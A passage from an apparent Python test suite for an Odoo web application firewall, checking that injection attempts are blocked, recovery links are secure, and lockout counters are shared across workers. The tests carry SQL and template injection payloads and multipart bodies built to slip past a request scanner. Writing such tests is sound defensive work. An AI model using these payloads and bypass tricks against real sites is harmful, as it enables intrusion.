            lambda env: env["waf.rule"].search_count(
                [("code", "in", ("waf-ssti-arith-q", "waf-ssti-arith-b"))])
            == 2))
        try:
            for q in ("/?x=%7B%7B7*7%7D%7D", "/?x=%24%7B7*7%7D",
                      "/?x=%24%7B7%2B7%7D"):  # ${7+7}: + must stay encoded
                r = self.url_open(q)
                self.assertEqual(r.status_code, 403, q)
                self.assertIn("Access blocked", r.text, q)
            # plain arithmetic without template braces stays legal
            r = self.url_open("/web/login?price=10*5")
            self.assertNotEqual(r.status_code, 403)
            middleware.flush_hits()
            ssti = self._dbread(lambda env: env["waf.hit"].search_count(
                [("category", "=", "ssti"), ("blocked", "=", True)]))
            self.assertEqual(ssti, 3)
        finally:
            # sev-4 hits also credit the auto-lockout: keep the run clean
            self._dbwrite(lambda env: env["waf.ip.entry"].search(
                [("source", "=", "auto")]).unlink())

    def test_21_expired_recovery_link_rejected(self):
        # links are now short-lived (15 min); an expired one must not
        # lift anything -- and every failure mode answers identically,
        # so the route can never oracle database names or token state
        def _setup(env):
            env["waf.ip.entry"].create({
                "network": "198.51.100.9/32", "kind": "deny",
                "source": "auto", "reason": "test auto"})
        self._dbwrite(_setup)
        try:
            secret = self._dbread(lambda env: env["waf.config"]
                                  .get_singleton().recover_secret)
            token = recovery.make_token(secret, self.env.cr.dbname,
                                        "198.51.100.9/32", ttl_minutes=-1)
            r = self.url_open("/waf/recover/%s" % token)
            self.assertEqual(r.status_code, 400)
            self.assertIn(b"Invalid or expired recovery link", r.content)
            self.assertEqual(self._dbread(
                lambda env: env["waf.ip.entry"].search_count(
                    [("network", "=", "198.51.100.9/32"),
                     ("kind", "=", "deny"), ("active", "=", True)])), 1,
                "expired tokens must not lift the block")
        finally:
            self._dbwrite(lambda env: env["waf.ip.entry"].search([]).unlink())

    def test_22_recovery_mail_link_ignores_host_headers(self):
        # review critical: the lockout mail built the recovery URL from
        # the attacker-controlled Host / X-Forwarded-Host headers, so a
        # hostile click captured a *valid* token on the attacker's host
        # and could replay it. The link now always comes from the
        # admin-owned web.base.url -- and it is queued, not SMTP'd
        # inside the attacker's request.
        # NB: web.base.url is *read*, never written here: core itself
        # updates it from the first HTTP request inside the test
        # transaction, and a real-connection write would deadlock on it.
        def _setup(env):
            env["waf.config"].get_singleton().write(
                {"alert_email": "alerts@example.test"})
        self._dbwrite(_setup)
        base = self._dbread(lambda env: env["ir.config_parameter"]
                            .sudo().get_param("web.base.url", ""))
        middleware._recent_alerts.clear()
        middleware._alert_history.clear()
        middleware._apply_lockout(
            self.env.cr.dbname,
            {"ip": "203.0.113.97"},
            {"rule_name": "Test block rule", "auto_hits": 10},
            None,
            {"HTTP_HOST": "evil.example",
             "HTTP_X_FORWARDED_HOST": "evil.example",
             "wsgi.url_scheme": "http"})
        try:
            mail = self._dbread(lambda env: next(
                ((m.subject, m.body_html, m.state)
                 for m in env["mail.mail"].sudo().search(
                     [("subject", "ilike", "OW Shield: automatic%")],
                     limit=1)), None))
            self.assertTrue(mail, "lockout must alert the admins")
            _subject, body, state = mail
            expected = (base.rstrip("/") if base
                        else "http://127.0.0.1:8169")  # socket fallback
            self.assertIn(expected + "/waf/recover/", body,
                          "link must use web.base.url (or socket fallback)")
            self.assertNotIn("evil.example", body,
                             "client Host headers must never reach the link")
            self.assertEqual(state, "outgoing",
                             "mail is queued; no SMTP on the request path")
        finally:
            self._dbwrite(lambda env: env["mail.mail"].sudo().search(
                [("subject", "ilike", "OW Shield%")]).unlink())
            self._dbwrite(lambda env: env["waf.ip.entry"].search([]).unlink())
            middleware._recent_alerts.clear()
            middleware._alert_history.clear()

    def test_23_body_scan_multipart_chunked_jsonrpc(self):
        # review high: only a fixed content-type list was body-scanned.
        # application/json-rpc is a core JsonRPCDispatcher mimetype
        # (odoo/http.py), browsers post forms as multipart, and chunked
        # requests carry no Content-Length -- all three reached Odoo with
        # every body rule inert.
        middleware._counters.clear()
        ip = "203.0.113.98"
        payload = "1' UNION SELECT 1,2,3--"
        try:
            r = self.url_open(
                "/waf-body-probe", data={"q": payload},
                files={"f": ("ok.txt", b"hello world", "text/plain")},
                headers={"X-Real-IP": ip})
            self.assertEqual(r.status_code, 403, "multipart form field")
            r = self.url_open(
                "/waf-body-probe", data=payload,
                headers={"X-Real-IP": ip,
                         "Content-Type": "application/json-rpc"})
            self.assertEqual(r.status_code, 403, "application/json-rpc")

            def _chunks():
                yield payload.encode()
            r = self.url_open("/waf-body-probe", data=_chunks(),
                              headers={"X-Real-IP": ip})
            self.assertEqual(r.status_code, 403, "chunked body")
            # file *contents* stay out of scope: a benign text upload
            # mentioning SQL words must not be blocked (the form-data
            # parts around it are what gets scanned)
            r = self.url_open(
                "/waf-body-probe", files={
                    "f": ("notes.txt", b"a UNION SELECT on the farm",
                          "text/plain")},
                headers={"X-Real-IP": ip})
            self.assertNotEqual(r.status_code, 403, "file parts not scanned")
            middleware.flush_hits()
            n = self._dbread(lambda env: env["waf.hit"].search_count(
                [("ip", "=", ip), ("blocked", "=", True)]))
            self.assertEqual(n, 3)
        finally:
            self._dbwrite(lambda env: env["waf.ip.entry"].search(
                [("source", "=", "auto")]).unlink())
            middleware._counters.clear()

    def test_24_portal_users_not_trusted_for_no_session_rules(self):
        # review medium: the no_session exemption accepted any uid > 0,
        # so on free-signup sites anyone could create a portal account
        # and skip every no_session rule on /web/dataset, /json, ... The
        # exemption is now internal users only (base.group_user).
        dbname = self.env.cr.dbname
        portal = self.env["res.users"].create({
            "name": "WAF Portal Probe", "login": "waf-portal-probe",
            "password": "Waf-Portal-Probe-1",
            "group_ids": [(6, 0, [self.env.ref("base.group_portal").id])],
        })
        admin = self.env.ref("base.user_admin")
        middleware.reset_caches()
        try:
            self.assertFalse(middleware._internal_uid(dbname, portal.id),
                             "portal users must not get the exemption")
            self.assertTrue(middleware._internal_uid(dbname, admin.id),
                            "internal users keep the exemption")
            # cached path must answer the same as the SQL path
            self.assertFalse(middleware._internal_uid(dbname, portal.id))
        finally:
            portal.unlink()

    def test_25_loader_survives_archived_builtin_rules(self):
        # review high: switching a built-in rule off archives it, but the
        # loader's lookup respected active_test -- it then create()d the
        # same code and tripped the unique(code) constraint, breaking
        # every later `-u ow_shield` *and* the Reload button. Local
        # action tuning must also survive reloads, not just the flag.
        code = "waf-ssti-arith-q"

        def _tune_and_reload(env):
            rule = env["waf.rule"].search([("code", "=", code)])
            self.assertTrue(rule)
            rule.write({"action": "log"})
            rule.toggle_active()  # "switch off" == archive
            return env["waf.rule"].load_builtin_rules()  # must not raise
        self._dbwrite(_tune_and_reload)
        state = self._dbread(lambda env: [
            (r.active, r.action) for r in env["waf.rule"]
            .with_context(active_test=False).search([("code", "=", code)])])
        self.assertEqual(len(state), 1, "no duplicate row was created")
        active, action = state[0]
        self.assertFalse(active, "the admin's switch-off survives")
        self.assertEqual(action, "log", "local tuning survives")
        pattern = self._dbread(lambda env: env["waf.rule"].with_context(
            active_test=False).search([("code", "=", code)]).pattern)
        self.assertIn("[-+*/%]", pattern,
                      "pack pattern fixes still land on tuned rules")
        # restore for the other tests
        self._dbwrite(lambda env: env["waf.rule"].with_context(
            active_test=False).search([("code", "=", code)]).write(
                {"active": True, "action": "block"}))

    def test_26_recovery_route_cannot_probe_databases(self):
        # review medium: dbname came from the token unchecked and the
        # distinct 400/404/500 answers disclosed which databases exist.
        # Now: dbfilter-gated before connecting, one generic 400 always.
        r = self.url_open(
            "/waf/recover/nosuchdb~198.51.100.10/32~9999999999~deadbeef")
        self.assertEqual(r.status_code, 400)
        self.assertIn(b"Invalid or expired recovery link", r.content)
        # a *valid* token for a database the host's dbfilter rejects is
        # refused the same way, without touching the database
        from odoo.tools import config as srv
        orig = srv["dbfilter"]
        token = recovery.make_token(
            self.env["waf.config"].get_singleton().recover_secret,
            self.env.cr.dbname, "198.51.100.11/32")
        srv["dbfilter"] = "^unmatched-%h-nope$"
        try:
            middleware.reset_caches()
            r = self.url_open("/waf/recover/%s" % token)
            # core's own dispatch 404s when the dbfilter matches nothing
            # (it never reaches us at all); our own gate answers 400.
            # Both are opaque; what must NOT happen is the token working.
            self.assertIn(r.status_code, (400, 404))
            self.assertEqual(self._dbread(
                lambda env: env["waf.ip.entry"].search_count(
                    [("network", "=", "198.51.100.11/32")])), 0)
        finally:
            srv["dbfilter"] = orig
            middleware.reset_caches()

    def test_27_timed_flush_writes_buffered_hits(self):
        # review medium: the hit buffer only flushed when the *next* hit
        # arrived, so a quiet worker kept hits in memory indefinitely and
        # lost them on restart. guard() now calls flush_if_stale()
        # (throttled) on the request path, and atexit flushes on exit.
        r = self.url_open("/waf-test-blockme",
                          headers={"X-Real-IP": "203.0.113.91"})
        self.assertEqual(r.status_code, 403)
        # age the buffer beyond FLUSH_AGE without issuing another request
        middleware.flush_if_stale(time.monotonic() + middleware.FLUSH_AGE + 1)
        hits = self._dbread(lambda env: env["waf.hit"].search_count(
            [("path", "=", "/waf-test-blockme"), ("ip", "=", "203.0.113.91")]))
        self.assertEqual(hits, 1, "aged buffer must self-flush")
        self._dbwrite(lambda env: env["waf.ip.entry"].search(
            [("source", "=", "auto")]).unlink())
        middleware._counters.clear()

    def test_28_multipart_lf_only_separators_are_scanned(self):
        # review round-2: the scanner only split part headers at "\r\n\r\n",
        # but werkzeug's BLANK_LINE_RE also accepts "\n\n" and "\r\r" --
        # such bodies parse into real form values in Odoo yet reached it
        # with every body rule inert.
        payload = b"1' UNION SELECT 1,2,3--"
        middleware._counters.clear()
        ip_lf, ip_cr = "203.0.113.99", "203.0.114.1"
        try:
            for ip, ending, sep in ((ip_lf, "lf", b"\n"), (ip_cr, "cr", b"\r")):
                body = (b"--owprobe" + sep
                        + b'Content-Disposition: form-data; name="q"' + sep
                        + sep + payload + sep
                        + b"--owprobe--" + sep)
                r = self.url_open(
                    "/waf-body-probe", data=body,
                    headers={"Content-Type": "multipart/form-data; "
                                              "boundary=owprobe",
                             "X-Real-IP": ip})
                self.assertEqual(r.status_code, 403,
                                 "%s-terminated multipart must be scanned"
                                 % ending)
            middleware.flush_hits()
            for ip in (ip_lf, ip_cr):
                self.assertEqual(self._dbread(
                    lambda env: env["waf.hit"].search_count(
                        [("ip", "=", ip), ("blocked", "=", True)])), 1)
        finally:
            self._dbwrite(lambda env: env["waf.ip.entry"].search(
                [("source", "=", "auto")]).unlink())
            middleware._counters.clear()

    def test_29_multipart_filename_spoof_header_still_scanned(self):
        # review round-2: any "filename=" substring in the part headers made
        # the scanner skip the part, but werkzeug only treats a part as a
        # file when its *Content-Disposition* has a filename parameter --
        # a dummy "X: filename=" header still posts an ordinary field that
        # must stay in scan scope. (And a real file part must stay out of
        # scope: same payload, genuine filename parameter -> no block.)
        payload = "1' UNION SELECT 1,2,3--"
        middleware._counters.clear()
        ip = "203.0.114.2"
        try:
            spoofed = (b"--owprobe\r\n"
                       b'Content-Disposition: form-data; name="q"\r\n'
                       b"X-Nope: filename=\r\n\r\n"
                       + payload.encode() + b"\r\n--owprobe--\r\n")
            r = self.url_open(
                "/waf-body-probe", data=spoofed,
                headers={"Content-Type": "multipart/form-data; "
                                          "boundary=owprobe",
                         "X-Real-IP": ip})
            self.assertEqual(r.status_code, 403,
                             "field with spoofed filename= header must scan")
            real_file = (b"--owprobe\r\n"
                         b'Content-Disposition: form-data; name="f"; '
                         b'filename="notes.txt"\r\n\r\n'
                         + payload.encode() + b"\r\n--owprobe--\r\n")
            r = self.url_open(
                "/waf-body-probe", data=real_file,
                headers={"Content-Type": "multipart/form-data; "
                                          "boundary=owprobe",
                         "X-Real-IP": ip})
            self.assertNotEqual(r.status_code, 403,
                                "genuine file parts stay out of scope")
        finally:
            self._dbwrite(lambda env: env["waf.ip.entry"].search(
                [("source", "=", "auto")]).unlink())
            middleware._counters.clear()

    def test_30_multipart_fake_boundary_inside_value_is_scanned(self):
        # review round-3: the scanner split on every "--<boundary>"
        # occurrence, but werkzeug's state machine only recognises a
        # boundary when a line break PRECEDES it -- a fake boundary hidden
        # inside a value split the payload in half, and the tail (no blank
        # line of its own) was skipped while the app received the whole
        # value as one ordinary form field. The scanner now runs werkzeug's
        # own decoder, so both views are the same by construction.
        payload = b"hello--owprobe1' UNION SELECT 1,2,3--"
        middleware._counters.clear()
        ip = "203.0.114.3"
        try:
            body = (b"--owprobe\r\n"
                    b'Content-Disposition: form-data; name="q"'
                    b"\r\n\r\n" + payload + b"\r\n--owprobe--\r\n")
            r = self.url_open(
                "/waf-body-probe", data=body,
                headers={"Content-Type": "multipart/form-data; "
                                          "boundary=owprobe",
                         "X-Real-IP": ip})
            self.assertEqual(r.status_code, 403,
                             "value containing --boundary must be scanned")
        finally:
            self._dbwrite(lambda env: env["waf.ip.entry"].search(
                [("source", "=", "auto")]).unlink())
            middleware._counters.clear()

    def test_31_multipart_duplicate_content_disposition_first_wins(self):
        # review round-3: the scanner merged every Content-Disposition
        # header before deciding, but werkzeug resolves duplicate part
        # headers by FIRST occurrence only (Headers lookup) -- a harmless
        # CD first plus a filename=-carrying second posted an ordinary
        # form field in the app while the merged view saw a "file upload"
        # and skipped the payload.
        payload = b"1' UNION SELECT 1,2,3--"
        middleware._counters.clear()
        ip = "203.0.114.4"
        try:
            body = (b"--owprobe\r\n"
                    b'Content-Disposition: form-data; name="q"\r\n'
                    b'Content-Disposition: form-data; name="q"; '
                    b'filename="x.txt"\r\n\r\n'
                    + payload + b"\r\n--owprobe--\r\n")
            r = self.url_open(
                "/waf-body-probe", data=body,
                headers={"Content-Type": "multipart/form-data; "
                                          "boundary=owprobe",
                         "X-Real-IP": ip})
            self.assertEqual(r.status_code, 403,
                             "first Content-Disposition wins: ordinary "
                             "field must be scanned")
        finally:
            self._dbwrite(lambda env: env["waf.ip.entry"].search(
                [("source", "=", "auto")]).unlink())
            middleware._counters.clear()

    def test_32_archived_internal_user_loses_no_session_trust(self):
        # review round-2 low #5: _internal_uid() only checked share, so an
        # archived internal user whose session file still sits in the
        # server-side store kept skipping every no_session rule. Match
        # core semantics: a deactivated user is trusted by nothing.
        # The user must be created through _dbwrite: the middleware runs
        # on its own pooled connection and only sees *committed* rows.
        dbname = self.env.cr.dbname

        def _mk(env):
            user = env["res.users"].create({
                "name": "WAF Archived Insider", "login": "waf-arch-insider",
                "password": "Waf-Arch-Insider-1",
                "group_ids": [(6, 0, [env.ref("base.group_user").id])],
            })
            user.active = False  # archive; the session file lingers
            return user.id

        uid = self._dbwrite(_mk)  # _dbwrite resets the uid cache
        try:
            self.assertFalse(middleware._internal_uid(dbname, uid),
                             "archived internal users must not be trusted")
            # the cached answer must match the SQL answer
            self.assertFalse(middleware._internal_uid(dbname, uid))
        finally:
            self._dbwrite(lambda env: env["res.users"].with_context(
                active_test=False).browse(uid).unlink())

    def test_33_background_error_logs_are_throttled(self):
        # review round-2 low #2: flush_hits() and _apply_lockout() read
        # the 30s throttle timestamp but never wrote it, so while the
        # database was down every failed flush/lockout logged its own
        # full traceback.
        mw = middleware
        calls = []

        def boom(*args, **kwargs):
            raise RuntimeError("database down")

        orig = (mw.db_connect, mw._logger.warning, mw._last_error_ts)
        mw.db_connect = boom
        mw._logger.warning = lambda *a, **k: calls.append(a[0])
        try:
            mw._last_error_ts = 0.0
            for _ in range(3):
                with mw._hit_lock:
                    mw._hit_buffer = [("anydb", [{"ref": "x"}])]
                mw.flush_hits()
            self.assertEqual(
                calls, ["WAF: could not flush hits for %s (%d of %d stored)"],
                "repeat flush failures must share one log line")
            self.assertGreater(mw._last_error_ts, 0.0,
                               "the throttle must record its timestamp")

            del calls[:]
            mw._last_error_ts = 0.0
            req = {"ip": "198.51.100.23"}
            decision = {"rule_name": "t", "auto_hits": 5}
            for _ in range(3):
                mw._apply_lockout("anydb", req, decision, {}, {})
            self.assertEqual(calls, ["WAF: could not apply auto lockout"])
            self.assertGreater(mw._last_error_ts, 0.0)
        finally:
            mw.db_connect, mw._logger.warning, mw._last_error_ts = orig
            with mw._hit_lock:
                mw._hit_buffer = []

    def test_34_hit_actions_need_ip(self):
        # review round-2 low #3: the IP resolver can come back empty-
        # handed, and _request_ip() then did self.ip + ... -> TypeError,
        # crashing the Block/Allow IP buttons on those hits.
        hit = self.env["waf.hit"].create({"method": "GET", "path": "/no-ip"})
        self.assertFalse(hit.ip)
        with self.assertRaises(UserError):
            hit.action_block_ip()
        with self.assertRaises(UserError):
            hit.action_allow_ip()
        # the ordinary path must keep working
        good = self.env["waf.hit"].create(
            {"ip": "198.51.100.77", "method": "GET", "path": "/has-ip"})
        good.action_block_ip()
        self.assertTrue(self.env["waf.ip.entry"].search_count(
            [("network", "=", "198.51.100.77/32"), ("kind", "=", "deny")]))

    def test_35_lockout_counter_shared_across_workers(self):
        # production finding (openworx.nl, 7 workers): the attack deque in
        # engine.evaluate is one worker's private view, while SO_REUSEPORT
        # spreads every nginx upstream connection across workers -- the
        # configured threshold effectively became threshold x workers and
        # a real burst never locked anything out. The counter must live
        # in the database where every worker credits the same total.
        dbname = self.env.cr.dbname
        net = "203.0.116.55/32"

        def _setup(env):
            cfg = env["waf.config"].get_singleton()
            before = {f: cfg[f] for f in ("auto_lockout_enabled",
                                          "auto_lockout_max",
                                          "auto_lockout_window")}
            env["waf.lockout.hit"].search([("network", "=", net)]).unlink()
            cfg.write({"mode": "enforce", "auto_lockout_enabled": True,
                       "auto_lockout_max": 3})
            return before

        before = self._dbwrite(_setup)
        try:
            for i in range(1, 4):
                # every request "lands on a fresh worker": clear the
                # worker-local deques (and policy cache) so only the
                # shared DB counter can possibly reach the limit of 3
                middleware.reset_caches()
                r = self.url_open(
                    f"/?q=1%20UNION%20SELECT%20sh{i}--",
                    headers={"X-Real-IP": "203.0.116.55"})
                self.assertEqual(r.status_code, 403)
                entry = self._dbread(lambda env: env["waf.ip.entry"].search([
                    ("network", "=", net), ("source", "=", "auto")]))
                if i < 3:
                    self.assertFalse(entry, "no lockout before the limit")
                else:
                    self.assertTrue(entry, "shared count 3 >= limit 3 must "
                                           "lock out even though every "
                                           "worker saw a single hit")
        finally:
            middleware.reset_caches()
            self._dbwrite(lambda env: (
                env["waf.ip.entry"].search([("source", "=", "auto")]).unlink(),
                env["waf.lockout.hit"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.config"].get_singleton().write(before),
            ))

    def test_36_shared_counter_bumps_and_tumbling_window(self):
        # the raw counter round-trip: monotonically shared across
        # connections (survives a simulated worker restart), and a fully
        # aged-out window restarts the count at 1 (tumbling semantics)
        dbname = self.env.cr.dbname
        net = "203.0.116.57/32"
        self._dbwrite(lambda env: env["waf.lockout.hit"]
                      .search([("network", "=", net)]).unlink())
        try:
            self.assertEqual(middleware._bump_lockout(dbname, net, 3600), 1)
            middleware.reset_caches()  # as good as a new worker process
            self.assertEqual(middleware._bump_lockout(dbname, net, 3600), 2)
            self.assertEqual(middleware._bump_lockout(dbname, net, 3600), 3)
            # window 0: the stored window has (trivially) aged out -> reset
            self.assertEqual(middleware._bump_lockout(dbname, net, 0), 1)
            row = self._dbread(lambda env: env["waf.lockout.hit"].search([
                ("network", "=", net)]))
            self.assertEqual(len(row), 1, "exactly one row per network")
        finally:
            self._dbwrite(lambda env: env["waf.lockout.hit"]
                          .search([("network", "=", net)]).unlink())

    def test_37_recovery_clears_shared_counter(self):
        # the reset gap (review): the shared row used to sit at >= max
        # after a block, so a false-positive victim who used the
        # recovery link was re-blocked by the very next flagged hit --
        # and the 15-min network mail suppression left them no second
        # link. Block *and* recovery must both end the window.
        net = "203.0.116.58/32"

        def _setup(env):
            cfg = env["waf.config"].get_singleton()
            before = {f: cfg[f] for f in ("auto_lockout_enabled",
                                          "auto_lockout_max")}
            env["waf.lockout.hit"].search([("network", "=", net)]).unlink()
            cfg.write({"mode": "enforce", "auto_lockout_enabled": True,
                       "auto_lockout_max": 3})
            return before

        before = self._dbwrite(_setup)
        try:
            for i in range(1, 4):
                middleware.reset_caches()
                r = self.url_open(f"/?q=1%20UNION%20SELECT%20rc{i}--",
                                  headers={"X-Real-IP": "203.0.116.58"})
                self.assertEqual(r.status_code, 403)
            entry = self._dbread(lambda env: env["waf.ip.entry"].search([
                ("network", "=", net), ("source", "=", "auto")]))
            self.assertTrue(entry, "3 shared hits must lock out")
            # the same link a locked-out admin would click
            cfg = self.env["waf.config"].get_singleton()
            token = recovery.make_token(
                cfg.recover_secret, self.env.cr.dbname, net)
            r = self.url_open("/waf/recover/%s" % token)
            self.assertEqual(r.status_code, 200)
            # one more flagged hit: with a stale shared count this would
            # re-block instantly; the window must have restarted at 1
            middleware.reset_caches()
            r = self.url_open("/?q=1%20UNION%20SELECT%20rc4--",
                              headers={"X-Real-IP": "203.0.116.58"})
            self.assertEqual(r.status_code, 403)  # the rule still bites
            self.assertFalse(self._dbread(
                lambda env: env["waf.ip.entry"].search([
                    ("network", "=", net), ("source", "=", "auto")])),
                "recovered network must not be re-blocked at 1 new hit")
            row = self._dbread(lambda env: [r.hits for r in env[
                "waf.lockout.hit"].search([("network", "=", net)])])
            self.assertEqual(row, [1],
                             "counter restarted from zero after recovery")
        finally:
            middleware.reset_caches()
            self._dbwrite(lambda env: (
                env["waf.ip.entry"].search([("source", "=", "auto")]).unlink(),
                env["waf.lockout.hit"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.config"].get_singleton().write(before),
            ))

    def test_38_learning_mode_never_touches_shared_counter(self):
        # Learning mode never applies a lockout (only Enforce does), so
        # DB crediting there is pure overhead -- in the phase with the
        # most false positives. The request path must stay write-free.
        net = "203.0.116.59/32"

        def _setup(env):
            cfg = env["waf.config"].get_singleton()
            before = {f: cfg[f] for f in ("mode", "auto_lockout_enabled",
                                          "auto_lockout_max")}
            env["waf.lockout.hit"].search([("network", "=", net)]).unlink()
            cfg.write({"mode": "learning", "auto_lockout_enabled": True,
                       "auto_lockout_max": 3})
            return before

        before = self._dbwrite(_setup)
        try:
            for i in range(1, 6):
                middleware.reset_caches()
                r = self.url_open(f"/?q=1%20UNION%20SELECT%20lm{i}--",
                                  headers={"X-Real-IP": "203.0.116.59"})
                self.assertEqual(r.status_code, 200)  # learning: log only
            self.assertFalse(self._dbread(
                lambda env: env["waf.lockout.hit"].search(
                    [("network", "=", net)])),
                "no DB crediting while learning")
            self.assertFalse(self._dbread(
                lambda env: env["waf.ip.entry"].search([
                    ("network", "=", net), ("source", "=", "auto")])),
                "learning never locks out")
        finally:
            middleware.reset_caches()
            self._dbwrite(lambda env: (
                env["waf.lockout.hit"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.config"].get_singleton().write(before),
            ))

    def test_39_stale_worker_credit_never_beats_shared_counter(self):
        # review F03: the worker-local deque may hold credit earned in an
        # earlier window or while LEARNING. Whenever the shared DB count
        # is available it is authoritative, alone. NB: this test must NOT
        # call reset_caches() mid-run -- it wipes the very deques that
        # form the scenario.
        net = "203.0.116.62/32"

        def _setup(env):
            cfg = env["waf.config"].get_singleton()
            before = {f: cfg[f] for f in ("mode", "auto_lockout_enabled",
                                          "auto_lockout_max")}
            env["waf.lockout.hit"].search([("network", "=", net)]).unlink()
            env["waf.ip.entry"].search([("network", "=", net)]).unlink()
            cfg.write({"mode": "enforce", "auto_lockout_enabled": True,
                       "auto_lockout_max": 3})
            return before

        before = self._dbwrite(_setup)
        try:
            db = self.env.cr.dbname

            def _flip(**cfg_w):
                # write config + clear rows WITHOUT reset_caches: the
                # worker-local deque is precisely the state under test
                with db_connect(db).cursor() as cr:
                    cr.rollback()
                    env = api.Environment(cr, SUPERUSER_ID, {})
                    env["waf.config"].get_singleton().write(cfg_w)
                    env["waf.lockout.hit"].search(
                        [("network", "=", net)]).unlink()
                    cr.commit()
                middleware._snaps.pop(db, None)

            # shape 1: deque sits one credit shy of the threshold from an
            # OLD window while the shared row was cleared to zero by the
            # block/recovery that ended that window
            middleware._counters.setdefault(db, {})[
                "203.0.116.62"] = deque([time.time()] * 2)
            r = self.url_open("/?q=1%20UNION%20SELECT%20f3a--",
                              headers={"X-Real-IP": "203.0.116.62"})
            self.assertEqual(r.status_code, 403)  # the rule still bites
            self.assertFalse(self._dbread(
                lambda env: env["waf.ip.entry"].search([
                    ("network", "=", net), ("source", "=", "auto")])),
                "shared count 1 < 3: deque credit must not add up")
            # shape 2 (the review's literal repro): learning-mode credit,
            # then a flip to Enforce
            _flip(mode="learning")
            for i in range(1, 3):
                r = self.url_open(f"/?q=1%20UNION%20SELECT%20f3b{i}--",
                                  headers={"X-Real-IP": "203.0.116.62"})
                self.assertEqual(r.status_code, 200)  # learning: log only
            _flip(mode="enforce")
            r = self.url_open("/?q=1%20UNION%20SELECT%20f3c--",
                              headers={"X-Real-IP": "203.0.116.62"})
            self.assertEqual(r.status_code, 403)
            self.assertFalse(self._dbread(
                lambda env: env["waf.ip.entry"].search([
                    ("network", "=", net), ("source", "=", "auto")])),
                "deque credit learned under another mode must not leak")
        finally:
            middleware.reset_caches()
            self._dbwrite(lambda env: (
                env["waf.ip.entry"].search([("network", "=", net)]).unlink(),
                env["waf.lockout.hit"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.config"].get_singleton().write(before),
            ))

    def test_40_worker_local_fallback_when_db_credit_fails(self):
        # review F03 the positive side: when the shared UPSERT cannot run
        # at all, the worker's own deque must still be able to lock out
        # -- degraded per-worker behaviour beats no lockout at all.
        net = "203.0.116.64/32"

        def _setup(env):
            cfg = env["waf.config"].get_singleton()
            before = {f: cfg[f] for f in ("auto_lockout_enabled",
                                          "auto_lockout_max")}
            env["waf.lockout.hit"].search([("network", "=", net)]).unlink()
            env["waf.ip.entry"].search([("network", "=", net)]).unlink()
            cfg.write({"mode": "enforce", "auto_lockout_enabled": True,
                       "auto_lockout_max": 3})
            return before

        before = self._dbwrite(_setup)
        orig = middleware._bump_lockout
        try:
            middleware._bump_lockout = lambda *a, **k: None
            for i in range(1, 4):
                r = self.url_open(f"/?q=1%20UNION%20SELECT%20f4{i}--",
                                  headers={"X-Real-IP": "203.0.116.64"})
                self.assertEqual(r.status_code, 403)
            self.assertTrue(self._dbread(
                lambda env: env["waf.ip.entry"].search([
                    ("network", "=", net), ("source", "=", "auto")])),
                "local deque must lock out when DB credit fails")
        finally:
            middleware._bump_lockout = orig
            middleware.reset_caches()
            self._dbwrite(lambda env: (
                env["waf.ip.entry"].search([("network", "=", net)]).unlink(),
                env["waf.lockout.hit"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.config"].get_singleton().write(before),
            ))

    def test_41_login_failure_credit_shared_across_workers(self):
        # review F04: login_fail credit lived in a registry dict -- one
        # per worker process -- so N workers allowed N x max attempts.
        # It is now one shared row per network. Foreign credit is
        # simulated with direct _bump_lockout calls (their own pooled
        # transaction, exactly what another worker's call produces); the
        # rest are real authenticate() failures from this process. The
        # default login_fail_max (10) stays untouched on purpose: the
        # request env cannot see _dbwrite'd config changes (RR snapshot),
        # same constraint as test_08.
        #
        # Round 16 F02: this scenario is the ENFORCE shared-credit
        # lockout -- enforce is pinned for authenticate()'s own read
        # through _pinned_config (test-env config writes are impossible
        # in this rig, see the helper).
        net = "203.0.116.61/32"
        net2 = "203.0.116.69/32"
        with self._pinned_config(mode="enforce"):
            self._test_41_shared_credit(net, net2)

    def _test_41_shared_credit(self, net, net2):
        self._dbwrite(lambda env: (
            env["waf.login.hit"].search([("network", "in",
                                          (net, net2))]).unlink(),
            env["waf.ip.entry"].search(
                [("network", "in", (net, net2))]).unlink()))
        try:
            db = self.env.cr.dbname
            for expect in range(1, 8):
                self.assertEqual(
                    middleware._bump_lockout(db, net, 30 * 60,
                                             table="waf_login_hit"),
                    expect, "shared login credit accumulates across workers")
            Users = self.env["res.users"].with_context(ip="203.0.116.61")
            for i in range(3):
                with self.assertRaises(Exception):
                    Users.authenticate(
                        {"type": "password", "login": "waf-brute-u41",
                         "password": "nope-%d" % i}, {})
            entries = self._dbread(lambda env: [
                (e.network, e.kind, e.source) for e in
                env["waf.ip.entry"].search([("network", "=", net)])])
            self.assertEqual(entries, [(net, "deny", "auto")],
                             "7 shared + 3 local = 10 must lock out")
            self.assertEqual(self._dbread(
                lambda env: env["waf.login.hit"].search_count(
                    [("network", "=", net)])), 0,
                "lockout ends the login counter window")
            # a successful login must end the window for ALL workers
            self.assertEqual(
                middleware._bump_lockout(db, net2, 30 * 60,
                                         table="waf_login_hit"), 1)
            self.env["res.users"].with_context(ip="203.0.116.69") \
                .authenticate({"type": "password", "login": "admin",
                               "password": "admin"}, {})
            self.assertEqual(self._dbread(
                lambda env: env["waf.login.hit"].search_count(
                    [("network", "=", net2)])), 0,
                "successful login clears shared login credit")
        finally:
            self._dbwrite(lambda env: (
                env["waf.login.hit"].search([]).unlink(),
                env["waf.ip.entry"].search(
                    [("network", "in", (net, net2))]).unlink()))

    def test_42_expired_auto_entry_does_not_mask_new_lockout(self):
        # review F05: the engine ignores expired entries at once, but the
        # _apply_lockout dedup only checked active=True -- so between an
        # entry's expiry and the hourly sweeper a new burst could NOT
        # re-block the network: only per-request rules protected it.
        net = "203.0.116.65/32"

        def _setup(env):
            cfg = env["waf.config"].get_singleton()
            before = {f: cfg[f] for f in ("auto_lockout_enabled",
                                          "auto_lockout_max")}
            env["waf.lockout.hit"].search([("network", "=", net)]).unlink()
            env["waf.ip.entry"].search([("network", "=", net)]).unlink()
            env["waf.ip.entry"].create({
                "network": net, "kind": "deny", "source": "auto",
                "reason": "expired test entry",
                "expires": fields.Datetime.now() - timedelta(minutes=5)})
            cfg.write({"mode": "enforce", "auto_lockout_enabled": True,
                       "auto_lockout_max": 3})
            return before

        before = self._dbwrite(_setup)
        try:
            for i in range(1, 4):
                middleware.reset_caches()
                r = self.url_open(f"/?q=1%20UNION%20SELECT%20f5{i}--",
                                  headers={"X-Real-IP": "203.0.116.65"})
                self.assertEqual(r.status_code, 403)
